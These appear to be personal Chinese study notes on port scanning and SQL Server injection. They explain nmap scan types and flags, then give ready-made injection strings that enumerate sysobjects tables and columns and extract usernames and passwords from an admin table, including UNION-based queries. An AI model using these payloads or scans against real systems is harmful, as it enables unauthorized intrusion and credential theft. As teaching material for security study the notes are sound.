端口扫描

RST比特用来复位，TCP连接三种情况：
1.不存在连接端口请求
2.异常终止一个链接。
3.检测半关闭连接

1.全TCP连接 connect()，
2.SYN半打开，（应答包含SYN和ACK，端口打开）
3.FIN秘密（应答RST端口关闭，否则丢包端口开启)变种 X-mas和Null （打开和关闭标记）适用Unix主机
5.UDP ICMP （Windows适用 ）

命令总结：
-sT：扫描TCP数据包以建立的连接connect()

-sS：扫描TCP数据包带有SYN数据的标记（发送SYN,收到SYN|ACK，发送RST代替ACK，连接终止，三次握手未实现。）

-sP：以ping方式进行扫描

-sU：以UDP数据包格式进行扫描

-sF,-sX,-sN：以Fin,Xmas,Null方式扫描

SQLSERVER注入

每一个数据库都会有用户表和系统表，在系统表sysobjects中。
name （数据表的名字），xtype（数据表的类型 u为用户表），id（ 数据表的对象标志）。

猜表

and (select top 1 name from sysobjects where xtype='u')>0 (得到第一个表名:比如user)

and (select top 1 name from sysobjects where xtype='u' and name not in ('user'))>0

猜列

and (select top 1 col_name(object_id('admin'),1) from sysobjects)>0

猜字段

and (select top 1 username from [admin])>0 【直接得到用户名】
and (select top 1 password from [admin])>0 【直接得到密码】

and 1=(select count(*) from admin where len(username)>0)

select name,password,id from user union select user,pwd,uid from 表名

and 1=1 union select 1,2,3,4,5... from 表名
